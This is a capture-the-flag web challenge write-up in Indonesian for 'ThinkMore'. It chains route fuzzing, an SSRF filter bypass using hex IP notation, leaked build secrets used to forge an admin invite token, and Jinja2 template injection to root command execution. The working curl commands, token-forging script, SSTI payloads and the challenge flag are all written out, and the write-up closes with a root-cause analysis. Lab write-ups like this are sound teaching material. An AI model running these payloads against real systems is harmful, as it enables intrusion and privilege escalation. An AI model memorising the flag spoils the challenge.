# ThinkMore

## Informasi Challenge

- **Kategori:** Web
- **Judul:** ThinkMore
- **Deskripsi:**

> "If you know the enemy and know yourself, you need not fear the results of a hundred battles. If you know yourself but not the enemy, for every victory gained you will also suffer defeat."
>
> Sun Tzu, *Art of War*

- **Flag:**

```text
LYKNCTF{8977a05ebdf842d69cb1bd54caeb0659}
```

---

## Ringkasan Kerentanan

Challenge ini bukan satu bug tunggal, tetapi rantai eksploitasi beberapa kelemahan:

1. Route tersembunyi `/mirror` ditemukan melalui authenticated content discovery.
2. Fitur mirror melakukan server-side fetch terhadap URL yang diberikan user.
3. SSRF filter dapat dilewati menggunakan representasi alamat IP nonstandar.
4. Service internal `cache-proxy:5000` membocorkan build information.
5. Source map JavaScript internal membocorkan algoritma pembuatan invite token admin.
6. Invite token dapat dipalsukan untuk menaikkan role akun menjadi `admin`.
7. Admin billing template dirender oleh Jinja2.
8. Proteksi template hanya berada di JavaScript client-side.
9. SSTI Jinja2 memberikan RCE sebagai root pada container aplikasi.
10. Flag asli tersimpan di `/flag.txt`.

Alur akhirnya:

```text
Register/Login
    ↓
Fuzz authenticated routes
    ↓
/mirror
    ↓
SSRF ke service internal
    ↓
/internal/build-info
    ↓
source map internal-app.js.map
    ↓
forge invite token admin
    ↓
akses /admin
    ↓
SSTI pada billing template
    ↓
RCE
    ↓
cat /flag.txt
```

---

# Fase 1 — Reconnaissance Awal

Target awal:

```text
http://f84f94ea-6994-4823-be84-7813ed0fdc12.51.79.140.18.nip.io:8080
```

Halaman login menampilkan aplikasi bernama **Vendor Review Portal**.

```bash
curl http://f84f94ea-6994-4823-be84-7813ed0fdc12.51.79.140.18.nip.io:8080/login
```

Potongan respons:

```html
<title>Login - Vendor Review Portal</title>

<form action="/login" method="post">
    <input id="email" name="email" type="email" required>
    <input id="password" name="password" type="password" required>
</form>
```

Endpoint publik dan asset awal dipetakan menggunakan:

```bash
BASE='http://f84f94ea-6994-4823-be84-7813ed0fdc12.51.79.140.18.nip.io:8080'

for P in / /login /register /robots.txt /sitemap.xml /assets/app.js; do
    echo "=== $P ==="
    curl -sS -D /tmp/tm.h "$BASE$P" -o /tmp/tm.b
    awk 'NR==1 || tolower($1)~/^(location:|set-cookie:|content-type:|server:)/{
        gsub("\r","")
        print
    }' /tmp/tm.h
    echo "SIZE=$(wc -c </tmp/tm.b)"
    grep -Eio \
      'action="[^"]+|name="[^"]+|href="[^"]+|fetch\([^;]+|axios[^;]+|/api/[A-Za-z0-9_/?=&.-]+|vendor[^<"]*|preview[^<"]*|cache[^<"]*|admin[^<"]*|debug[^<"]*' \
      /tmp/tm.b | sort -u | head -30
done
```

Output penting:

```text
=== / ===
HTTP/1.1 302 Found
Location: /login
Set-Cookie: PHPSESSID=...

=== /login ===
HTTP/1.1 200 OK
action="/login
href="/register
name="email
name="password

=== /register ===
HTTP/1.1 200 OK
action="/register
name="email
name="password
name="username

=== /assets/app.js ===
HTTP/1.1 200 OK
cache-proxy to CDN before GA
```

Aplikasi menggunakan session PHP:

```text
PHPSESSID=...
```

---

# Fase 2 — Analisis JavaScript Client

Isi `/assets/app.js`:

```bash
curl -sS "$BASE/assets/app.js"
```

Output:

```javascript
// TODO: move cache-proxy to CDN before GA
document.addEventListener('DOMContentLoaded', () => {
  const guardedForm = document.querySelector('[data-template-guard]');
  const templateInput = document.querySelector('[data-template-input]');
  const warning = document.querySelector('[data-template-warning]');

  if (guardedForm && templateInput && warning) {
    guardedForm.addEventListener('submit', (event) => {
      const value = templateInput.value;
      if (value.includes('{{') || value.includes('{%') || value.includes('}}') || value.includes('%}')) {
        event.preventDefault();
        warning.hidden = false;
        warning.textContent = 'The browser editor blocked protected placeholder syntax.';
      }
    });
  }
});
```

Dua petunjuk langsung terlihat:

1. Ada service atau komponen bernama `cache-proxy`.
2. Ada editor template yang hanya diblokir lewat JavaScript browser.

Pada tahap ini belum diketahui di mana form template berada, tetapi jelas ada kemungkinan SSTI jika request dikirim langsung tanpa browser.

Form registrasi:

```html
<form action="/register" method="post">
    <input id="username" name="username" type="text" required maxlength="40">
    <input id="email" name="email" type="email" required>
    <input id="password" name="password" type="password" required minlength="8">
</form>
```

---

# Fase 3 — Register dan Login

Akun biasa dibuat untuk melihat attack surface setelah autentikasi.

```bash
BASE='http://f84f94ea-6994-4823-be84-7813ed0fdc12.51.79.140.18.nip.io:8080'
U="nata$(date +%s)"
E="$U@test.local"
P='ThinkMore123!'
J=/tmp/thinkmore.cookie

curl -sS -L -c "$J" -b "$J" \
  -X POST "$BASE/register" \
  --data-urlencode "username=$U" \
  --data-urlencode "email=$E" \
  --data-urlencode "password=$P" \
  -o /dev/null

curl -sS -L -c "$J" -b "$J" \
  -X POST "$BASE/login" \
  --data-urlencode "email=$E" \
  --data-urlencode "password=$P" \
  -o /tmp/tm-home
```

Output pemetaan halaman sesudah login:

```text
USER=nata1783438787 EMAIL=nata1783438787@test.local
action="/logout
href="/assets/app.css
href="/dashboard
href="/profile
```

Dashboard menampilkan role akun:

```html
<p class="muted">
    Signed in as nata1783438787@test.local with role <strong>user</strong>.
</p>
```

Isi dashboard awal:

```html
<section class="panel">
    <h2>Your Vendor Queue</h2>
    <p class="muted">
        Cached previews are stored as text responses for review.
        Remote warm-up jobs are delegated to a separate renderer worker.
    </p>
    <p>No vendors yet.</p>
</section>
```

Petunjuk penting:

- Ada **cached preview**.
- Fetching dilakukan oleh **renderer worker terpisah**.
- User biasa belum memiliki vendor.

---

# Fase 4 — Percobaan Mass Assignment pada Profile

Form profile hanya menampilkan field username:

```html
<form action="/profile" method="post">
    <input id="username" name="username" type="text" maxlength="40">
    <input type="text" value="nata1783438787@test.local" disabled>
</form>
```

Dicoba beberapa parameter tambahan:

```bash
for KV in \
  'role=admin' \
  'is_admin=1' \
  'admin=1' \
  'user[role]=admin' \
  'profile[role]=admin'
do
    ...
done
```

Output:

```text
=== role=admin ===
role <strong>user

=== is_admin=1 ===
role <strong>user

=== admin=1 ===
role <strong>user

=== user[role]=admin ===
role <strong>user

=== profile[role]=admin ===
role <strong>user
```

Kesimpulan:

```text
Profile tidak rentan mass assignment.
```

---

# Fase 5 — Authenticated Route Fuzzing

Fuzzing route dilakukan setelah login, karena endpoint tertentu hanya muncul untuk user terautentikasi.

```bash
C=$(awk '$6=="PHPSESSID"{print $7}' /tmp/thinkmore.cookie)

ffuf \
  -u "$BASE/FUZZ" \
  -H "Cookie: PHPSESSID=$C" \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt \
  -mc 200,204,301,302,307,401,403,405,500 \
  -fc 404 \
  -ac \
  -t 80 \
  -rate 1200 \
  -timeout 4 \
  -noninteractive
```

Output penting:

```text
admin      [Status: 302, Size: 0]
profile    [Status: 200, Size: 1430]
dashboard  [Status: 200, Size: 1434]
mirror     [Status: 200, Size: 1519]
```

Route baru:

```text
/admin
/mirror
```

Akses langsung `/admin` mengembalikan redirect ke dashboard:

```text
HTTP/1.1 302 Found
Location: /dashboard
X-Release: review-2026.04-teamA
```

Header release ini nantinya sangat penting:

```text
X-Release: review-2026.04-teamA
```

---

# Fase 6 — Analisis `/mirror`

Isi `/mirror`:

```html
<div class="flash error">Backoffice access is restricted.</div>

<form action="/mirror" method="post">
    <input id="name" name="name" type="text" maxlength="80" required>
    <input
        id="logo_url"
        name="logo_url"
        type="url"
        placeholder="http://example.com/logo.txt"
        required
    >
    <button type="submit">Warm preview cache</button>
</form>
```

Deskripsi fitur:

```text
Submit a vendor record and a logo URL.
The portal fetches the remote asset and stores a text preview for review.
```

Ini merupakan indikasi kuat SSRF.

---

# Fase 7 — SSRF Awal dan Loopback Protection

Dicoba beberapa URL loopback:

```bash
for URL in \
  'http://127.0.0.1/admin' \
  'http://127.0.0.1:8080/admin' \
  'http://localhost/admin' \
  'http://localhost:8080/admin'
do
    ...
done
```

Semua request berhasil masuk ke queue:

```text
flash success">Vendor queued for preview warming.
```

Namun dashboard menunjukkan:

```text
Rejected: loopback targets are blocked.
```

Detail vendor:

```html
<span>Status: Rejected: loopback targets are blocked.</span>
<p><strong>Logo URL:</strong> http://127.0.0.1/admin</p>
<a href="/previews/1">Open cached preview</a>
```

Kesimpulan:

```text
Fitur server-side fetch benar-benar ada, tetapi memiliki filter loopback/private IP.
```

---

# Fase 8 — Bypass SSRF Filter Menggunakan Alternate IP Notation

Beberapa representasi IP dicoba:

```text
127.1
2130706433
0x7f000001
0177.0.0.1
0.0.0.0
[::1]
```

Output penting:

```text
127.1
Rejected: resolved private targets are blocked.

2130706433
Rejected: numeric hostnames are blocked.

0x7f000001
Fetch failed: Failed to connect to 127.0.0.1 port 80

0177.0.0.1
Rejected: resolved private targets are blocked.

0.0.0.0
Rejected: loopback targets are blocked.

[::1]
Rejected: loopback targets are blocked.
```

Representasi berikut lolos validasi awal:

```text
0x7f000001
```

Library HTTP kemudian menormalisasinya menjadi:

```text
127.0.0.1
```

Ini membuktikan SSRF filter memiliki canonicalization mismatch.

Tes ke port aplikasi:

```text
http://0x7f000001:8080/admin
```

Output:

```text
Status: Fetch failed: Failed to connect to 127.0.0.1 port 8080
```

Worker ternyata berjalan di container terpisah. Loopback worker bukan frontend PHP.

---

# Fase 9 — Internal Network Recon

Sejumlah hostname service internal dicoba:

```text
renderer
renderer-worker
worker
cache
cache-proxy
cacheproxy
backoffice
admin
internal
frontend
gateway
```

Port yang diuji:

```text
80
8080
5000
8000
```

Output paling penting:

```text
svc_cache-proxy_5000 Fetched with HTTP 404
```

Service internal ditemukan:

```text
cache-proxy:5000
```

Hostname `renderer` justru di-resolve ke loopback:

```text
svc_renderer_5000 Rejected: loopback targets are blocked.
```

---

# Fase 10 — Recon Service `cache-proxy:5000`

Endpoint umum diuji:

```text
/
/health
/admin
/flag
/debug
/render
/preview
/cache
/fetch
/template
/api
/api/render
/api/cache
```

Output:

```text
/health  Fetched with HTTP 200
/        Fetched with HTTP 200
```

Isi respons root dan health:

```json
{
  "build_label": "invoice-renderer-debug",
  "diagnostics": "/internal/build-info",
  "service": "renderer",
  "status": "ok",
  "team": "vrp-alpha"
}
```

Endpoint diagnostik internal ditemukan:

```text
/internal/build-info
```

---

# Fase 11 — Build Information Disclosure

SSRF diarahkan ke:

```text
http://cache-proxy:5000/internal/build-info
```

Output:

```text
TEAM_SLUG=vrp-alpha
INVITE_KEY_PART=renderer-preview-seed
BUILD_LABEL=invoice-renderer-debug
INSTANCE_SEED=5c622a01c7e991dafdcbabe0631e6dd4
DEBUG_ASSET=/static/internal-app.js.map
```

Informasi sensitif yang bocor:

```text
TEAM_SLUG=vrp-alpha
INVITE_KEY_PART=renderer-preview-seed
INSTANCE_SEED=5c622a01c7e991dafdcbabe0631e6dd4
DEBUG_ASSET=/static/internal-app.js.map
```

---

# Fase 12 — Source Map Disclosure

Asset debug diambil melalui SSRF:

```text
http://cache-proxy:5000/static/internal-app.js.map
```

Isi source map:

```javascript
const hiddenRoute = '/invite/accept';
const requiredScope = 'backoffice';
const requiredRole = 'admin';

function canonicalJson(payload) {
  const ordered = {};
  Object.keys(payload).sort().forEach((key) => {
    ordered[key] = payload[key];
  });
  return JSON.stringify(ordered);
}

function deriveSecret(inviteKeyPart, teamSlug, release, instanceSeed) {
  return sha256(`${inviteKeyPart}:${teamSlug}:${release}:${instanceSeed}`);
}

function buildInviteToken(email, exp, release, teamSlug, inviteKeyPart, instanceSeed) {
  const payload = {
    email,
    exp,
    role: requiredRole,
    scope: requiredScope,
    team: teamSlug,
  };

  const encoded = base64url(canonicalJson(payload));

  const signature = hmacSha256(
    canonicalJson(payload),
    deriveSecret(inviteKeyPart, teamSlug, release, instanceSeed)
  );

  return `${encoded}.${signature}`;
}
```

Informasi penting:

```text
Invite endpoint : /invite/accept
Required role   : admin
Required scope  : backoffice
Team            : vrp-alpha
```

Formula secret:

```text
SHA256(
    INVITE_KEY_PART
    + ":"
    + TEAM_SLUG
    + ":"
    + APP_RELEASE
    + ":"
    + INSTANCE_SEED
)
```

Nilai yang telah diketahui:

```text
INVITE_KEY_PART = renderer-preview-seed
TEAM_SLUG       = vrp-alpha
APP_RELEASE     = review-2026.04-teamA
INSTANCE_SEED   = 5c622a01c7e991dafdcbabe0631e6dd4
```

---

# Fase 13 — Forging Invite Token Admin

Payload token:

```json
{
  "email": "nata1783440206@test.local",
  "exp": 1783443948,
  "role": "admin",
  "scope": "backoffice",
  "team": "vrp-alpha"
}
```

Canonical JSON dibuat dengan key yang diurutkan dan separator tanpa spasi.

Base64 URL-safe payload kemudian digabung dengan signature HMAC-SHA256.

Beberapa kemungkinan interpretasi key diuji:

```text
hex-secret + hex-signature
raw-secret + hex-signature
hex-secret + b64url-signature
raw-secret + b64url-signature
```

Output:

```text
PROFILE_STATUS = 200
EMAIL = nata1783440206@test.local

hex-secret + hex-signature:
status=200
flash=Invite token was rejected.
role=user

raw-secret + hex-signature:
status=200
flash=Backoffice access granted.
role=admin
```

Token valid:

```text
eyJlbWFpbCI6Im5hdGExNzgzNDQwMjA2QHRlc3QubG9jYWwiLCJleHAiOjE3ODM0NDM5NDgsInJvbGUiOiJhZG1pbiIsInNjb3BlIjoiYmFja29mZmljZSIsInRlYW0iOiJ2cnAtYWxwaGEifQ.91816403c279fda3c203ded552896ae450e8c7f50c7d669c2c4d2ff05759ce68
```

Setelah token diterima:

```text
Backoffice access granted.
role=admin
```

Dashboard sekarang menampilkan link:

```text
/admin
```

---

# Fase 14 — Admin Billing Template

Halaman `/admin` menampilkan fitur billing template.

Form:

```html
<form action="/admin/billing/template" method="post" data-template-guard>
    <textarea
        id="billing_template"
        name="billing_template"
        data-template-input
    >
        &lt;h1&gt;Invoice for Cedar Supplies&lt;/h1&gt;
        &lt;p&gt;Prepared by Review Desk&lt;/p&gt;
        &lt;p&gt;Total due: $1480&lt;/p&gt;
    </textarea>
</form>
```

Deskripsi:

```text
Template changes are stored by the PHP frontend and rendered by the
internal invoice worker during preview.
```

Context yang tersedia:

```text
customer_name
reviewer_name
amount
```

Preview dibuat melalui:

```text
POST /admin/billing/preview
```

---

# Fase 15 — SSTI Confirmation

JavaScript client memblokir sintaks seperti `{{ ... }}`, tetapi server tidak melakukan validasi yang sama.

Payload dikirim langsung menggunakan `curl`:

```bash
curl -sS -o /dev/null \
  -b "$J" \
  -X POST "$BASE/admin/billing/template" \
  --data-urlencode 'billing_template=SSTI_TEST_{{7*7}}_END'
```

Kemudian preview dibuat:

```bash
curl -sS \
  -b "$J" \
  -X POST "$BASE/admin/billing/preview"
```

Output:

```text
SSTI_TEST_{{7*7}}_END
SSTI_TEST_49_END
```

Baris pertama adalah template yang tersimpan.

Baris kedua adalah hasil render worker:

```text
{{7*7}} → 49
```

Kesimpulan:

```text
SSTI Jinja2 terkonfirmasi.
```

---

# Fase 16 — Jinja2 SSTI ke RCE

Gadget Jinja2 yang digunakan:

```jinja2
{{ cycler.__init__.__globals__.os.popen('COMMAND').read() }}
```

Tes environment:

```jinja2
{{ cycler.__init__.__globals__.os.popen('env').read() }}
```

Output penting:

```text
FLAG=not_flag
```

Nilai tersebut jelas decoy.

---

# Fase 17 — Filesystem Recon dari RCE

Command panjang dikirim dalam Base64 agar aman dari masalah quoting.

Payload shell:

```bash
pwd
id
find /app /srv /opt /var/www /run/secrets /tmp /root /home \
  -maxdepth 4 \
  -type f \
  \( -iname "*flag*" -o -iname "*.env" -o -iname "*secret*" -o -iname "*.py" \)
```

Output:

```text
/app
uid=0(root) gid=0(root) groups=0(root)

---CANDIDATES---
/app/internal/app.py
```

RCE berjalan sebagai:

```text
uid=0(root)
```

---

# Fase 18 — Membaca Source Worker

File berikut dibaca:

```text
/app/internal/app.py
```

Isi penting:

```python
from flask import Flask, jsonify, request
from flask import render_template_string

@app.post("/render/invoice")
def render_invoice():
    payload = request.get_json(silent=True) or {}
    template = payload.get("template", "")
    context = payload.get("context", {})

    safe_context = {
        str(key): value
        for key, value in context.items()
    }

    rendered = render_template_string(template, **safe_context)

    return jsonify({"rendered": rendered}), 200
```

Root cause SSTI:

```python
render_template_string(template, **safe_context)
```

Template sepenuhnya dikontrol admin user dan dirender tanpa sandbox atau sanitasi server-side.

---

# Fase 19 — Recon Container

Command berikut dijalankan melalui SSTI RCE:

```bash
env | sort
ls -la /
find /app -maxdepth 4
mount
ps auxww
cat /etc/hosts
cat /etc/resolv.conf
```

Output environment penting:

```text
APP_ENV=production
APP_RELEASE=review-2026.04-teamA
APP_TEAM_SLUG=vrp-alpha
APP_INVITE_KEY_PART=renderer-preview-seed
INSTANCE_SEED_PATH=/app/storage/runtime/instance_seed
INTERNAL_RENDERER_URL=http://127.0.0.1:5000
FLAG=not_flag
```

Root filesystem:

```text
-rw-r--r-- 1 root root 42 Jul 7 16:02 /flag.txt
```

Output directory `/app`:

```text
/app/internal/app.py
/app/internal/static/internal-app.js.map
/app/src/Services/InviteTokenService.php
/app/src/Services/VendorFetcher.php
/app/src/Services/InternalRendererClient.php
/app/public/index.php
/app/storage/app.db
```

Network:

```text
127.0.0.1 cache-proxy
10.0.1.204 da11b5ebf477
```

Temuan final:

```text
/flag.txt
```

---

# Fase 20 — Membaca Flag

Payload final:

```jinja2
{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}
```

Command lengkap:

```bash
BASE='http://TARGET:8080'
J=/tmp/thinkmore.cookie

PAYLOAD="{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}"

curl -sS -o /dev/null \
  -b "$J" \
  -X POST "$BASE/admin/billing/template" \
  --data-urlencode "billing_template=$PAYLOAD"

curl -sS \
  -b "$J" \
  -X POST "$BASE/admin/billing/preview"
```

Output:

```text
LYKNCTF{8977a05ebdf842d69cb1bd54caeb0659}
```

---

# Flag

```text
LYKNCTF{8977a05ebdf842d69cb1bd54caeb0659}
```

---

# Exploit Chain Final

## 1. Register dan Login

```bash
BASE='http://TARGET:8080'
U="nata$(date +%s)"
E="$U@test.local"
P='ThinkMore123!'
J=/tmp/thinkmore.cookie

curl -sS -o /dev/null -c "$J" \
  -X POST "$BASE/register" \
  --data-urlencode "username=$U" \
  --data-urlencode "email=$E" \
  --data-urlencode "password=$P"

curl -sS -o /dev/null -b "$J" -c "$J" \
  -X POST "$BASE/login" \
  --data-urlencode "email=$E" \
  --data-urlencode "password=$P"
```

## 2. Ambil Build Info Internal lewat SSRF

```bash
curl -sS -o /dev/null -b "$J" \
  -X POST "$BASE/mirror" \
  --data-urlencode "name=buildinfo" \
  --data-urlencode \
  "logo_url=http://cache-proxy:5000/internal/build-info"
```

Informasi yang diperlukan:

```text
TEAM_SLUG=vrp-alpha
INVITE_KEY_PART=renderer-preview-seed
INSTANCE_SEED=5c622a01c7e991dafdcbabe0631e6dd4
DEBUG_ASSET=/static/internal-app.js.map
```

## 3. Ambil Source Map

```bash
curl -sS -o /dev/null -b "$J" \
  -X POST "$BASE/mirror" \
  --data-urlencode "name=sourcemap" \
  --data-urlencode \
  "logo_url=http://cache-proxy:5000/static/internal-app.js.map"
```

Source map membocorkan algoritma invite token.

## 4. Forge Invite Token

```python
import base64
import hashlib
import hmac
import json
import time

email = "USER_EMAIL"
release = "review-2026.04-teamA"
team = "vrp-alpha"
invite_key_part = "renderer-preview-seed"
instance_seed = "5c622a01c7e991dafdcbabe0631e6dd4"

payload = {
    "email": email,
    "exp": int(time.time()) + 3600,
    "role": "admin",
    "scope": "backoffice",
    "team": team,
}

canonical = json.dumps(
    payload,
    sort_keys=True,
    separators=(",", ":"),
)

encoded = base64.urlsafe_b64encode(
    canonical.encode()
).rstrip(b"=").decode()

material = (
    f"{invite_key_part}:{team}:{release}:{instance_seed}"
).encode()

derived_secret = hashlib.sha256(material).digest()

signature = hmac.new(
    derived_secret,
    canonical.encode(),
    hashlib.sha256,
).hexdigest()

token = f"{encoded}.{signature}"

print(token)
```

Submit:

```bash
curl -sS -b "$J" \
  -X POST "$BASE/invite/accept" \
  --data-urlencode "token=$TOKEN"
```

## 5. Exploit SSTI dan Baca Flag

```bash
PAYLOAD="{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}"

curl -sS -o /dev/null -b "$J" \
  -X POST "$BASE/admin/billing/template" \
  --data-urlencode "billing_template=$PAYLOAD"

curl -sS -b "$J" \
  -X POST "$BASE/admin/billing/preview"
```

---

# Root Cause Analysis

## 1. Authenticated Hidden Route Exposure

Route `/mirror` tidak ditampilkan langsung di dashboard user, tetapi tetap dapat diakses oleh akun biasa setelah ditemukan melalui fuzzing.

## 2. SSRF pada Vendor Fetcher

User dapat mengontrol URL yang diambil oleh worker.

Walaupun ada filter loopback dan private IP, filter tidak menangani seluruh bentuk canonical IP dengan benar.

Contoh bypass:

```text
0x7f000001
```

## 3. Internal Service Trust Boundary Failure

Service internal:

```text
cache-proxy:5000
```

dapat diakses melalui fitur mirror.

Service ini membocorkan:

- team slug
- invite key fragment
- instance seed
- debug asset path

## 4. Source Map Tersedia di Production

Source map internal berisi source JavaScript asli dan algoritma pembuatan token invite.

Asset debug seharusnya tidak tersedia pada build production.

## 5. Predictable Admin Invite Token

Semua bahan pembentukan secret dapat dibaca melalui endpoint internal dan header aplikasi.

Akibatnya attacker dapat membuat token dengan:

```text
role=admin
scope=backoffice
```

## 6. Client-Side-Only Template Protection

Frontend memblokir sintaks Jinja hanya lewat JavaScript:

```javascript
if (value.includes('{{')) {
    event.preventDefault();
}
```

Request langsung menggunakan `curl` melewati proteksi ini.

## 7. Unsafe `render_template_string`

Renderer menggunakan:

```python
render_template_string(template, **safe_context)
```

Template yang sepenuhnya dikontrol user langsung diproses oleh Jinja2 tanpa sandbox.

## 8. Container Berjalan sebagai Root

RCE berjalan sebagai:

```text
uid=0(root)
```

Dampak eksploitasi menjadi penuh.

## 9. Flag Tersimpan sebagai File Readable

Flag asli tersedia di:

```text
/flag.txt
```

dan dapat dibaca langsung oleh proses renderer.

---

```

Flag:

```text
LYKNCTF{8977a05ebdf842d69cb1bd54caeb0659}
```
